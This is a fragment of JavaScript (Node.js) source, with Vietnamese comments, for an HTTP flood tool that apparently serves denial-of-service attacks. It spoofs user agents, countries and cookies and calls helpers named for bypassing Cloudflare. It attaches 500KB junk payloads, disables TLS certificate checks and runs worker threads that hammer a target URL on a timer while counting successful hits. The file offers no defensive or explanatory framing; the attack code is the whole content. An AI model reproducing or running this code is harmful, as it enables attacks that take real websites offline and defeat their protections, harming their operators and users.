// ========== TẠO HEADER HOÀN CHỈNH ==========
function createHeaders(requestId, spoofCountry) {
  let headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Connection': 'close',
    'DNT': '1'
  };
  
  headers = BYPASS_METHODS.rotateUserAgent(headers);
  if (spoofCountry) headers = BYPASS_METHODS.multiLayerSpoof(headers, spoofCountry);
  headers = BYPASS_METHODS.cloudflareBypass(headers);
  headers = BYPASS_METHODS.fakeCookies(headers);
  
  headers['X-Request-ID'] = crypto.randomBytes(8).toString('hex');
  return headers;
}

// ========== TẠO PAYLOAD 500KB ==========
function createPayload(requestId) {
  return JSON.stringify({
    id: requestId,
    ts: Date.now(),
    random: crypto.randomBytes(32).toString('hex'),
    data: Buffer.alloc(500000, 'X').toString(),
    signature: crypto.createHash('sha256').update(`${requestId}`).digest('hex')
  });
}

// ========== GỬI REQUEST ==========
function sendRequest(url, headers, payload, method) {
  return new Promise((resolve) => {
    const parsedUrl = new URL(url);
    const options = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: method,
      headers: headers,
      timeout: 5000,
      rejectUnauthorized: false
    };
    
    const client = parsedUrl.protocol === 'https:' ? https : http;
    const req = client.request(options, (res) => {
      resolve({ success: res.statusCode < 400, status: res.statusCode });
    });
    
    req.on('error', () => resolve({ success: false, error: true }));
    req.on('timeout', () => { req.destroy(); resolve({ success: false, timeout: true }); });
    
    if (payload && method === 'POST') req.write(payload);
    req.end();
  });
}

// ========== WORKER THREAD ==========
if (!isMainThread) {
  const { targetUrl, threadId, enablePayload, spoofCountry, delay } = workerData;
  let count = 0, success = 0;
  
  setInterval(async () => {
    count++;
    const method = BYPASS_METHODS.rotateMethod();
    let headers = createHeaders(count, spoofCountry);
    let payload = enablePayload ? createPayload(count) : null;
    let url = BYPASS_METHODS.addRandomParams(targetUrl);
    
    const result = await sendRequest(url, headers, payload, method);
    if (result.success) success++;
    
    if (count % 50 === 0) parentPort.postMessage({ threadId, count, success });
  }, delay);
}

